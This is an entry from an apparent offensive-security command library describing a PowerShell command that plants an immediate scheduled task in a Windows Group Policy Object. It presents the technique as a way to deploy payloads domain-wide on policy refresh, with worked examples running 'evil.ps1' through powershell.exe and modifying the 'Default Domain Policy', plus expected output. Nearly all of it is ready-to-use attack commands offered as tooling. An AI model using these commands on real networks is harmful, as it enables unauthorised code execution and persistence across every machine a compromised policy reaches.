---
id: 0929dafe-5876-4a3f-ad2b-d2a8b21a111d
name: create-gpo-immediate-task
type: command
executor: powershell
data: >-
  Add-GPOImmediateTask -TaskName $_TASKNAME -Command $_COMMAND -CommandArguments
  "$_ARGUMENTS" -Author $_AUTHOR -Scope $_SCOPE -GPOIdentity $_GPONAME
output: null
created_at: '2023-04-06T03:56:03.665114+00:00'
updated_at: '2023-10-10T20:26:15.994624+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - execution
verified: true
validated: true
---

# create-gpo-immediate-task

## Command

```powershell
Add-GPOImmediateTask -TaskName $_TASKNAME -Command $_COMMAND -CommandArguments "$_ARGUMENTS" -Author $_AUTHOR -Scope $_SCOPE -GPOIdentity $_GPONAME
```

## Description

This command creates a scheduled task in a GPO that executes immediately upon policy refresh, useful for quick payload deployment without relying on logon or startup events.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TaskName $_TASKNAME | Name of the task (e.g., 'eviltask') | Yes |
| -Command $_COMMAND | Executable to run (e.g., 'powershell.exe') | Yes |
| -CommandArguments "$_ARGUMENTS" | Arguments for the command (e.g., "'/c $(Get-Content evil.ps1)'") | Yes |
| -Author $_AUTHOR | Author name for the task (e.g., 'Administrator') | Yes |
| -Scope $_SCOPE | Scope: 'Computer' or 'User' | Yes |
| -GPOIdentity $_GPONAME | The name of the GPO to modify (e.g., 'SuperSecureGPO') | Yes |

## Examples

### Basic Usage

```powershell
Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe' -CommandArguments "'/c $(Get-Content evil.ps1)'" -Author 'Administrator' -Scope 'Computer' -GPOIdentity 'SuperSecureGPO'
```

### Advanced Usage

```powershell
Add-GPOImmediateTask -TaskName 'PayloadDeploy' -Command 'cmd.exe' -CommandArguments '/c whoami > C:\temp\log.txt' -Author 'Domain Admin' -Scope 'User' -GPOIdentity 'Default Domain Policy'
```

## Expected Output

Successful execution produces output like:

"Immediate task 'eviltask' created in GPO 'SuperSecureGPO' for Computer scope."

Validation errors for invalid scopes or GPOs will appear.

## Related

- [[procedures/GPO-Abuse-with-PowerGPOAbuse]]
- [[commands/add-script-to-gpo]]
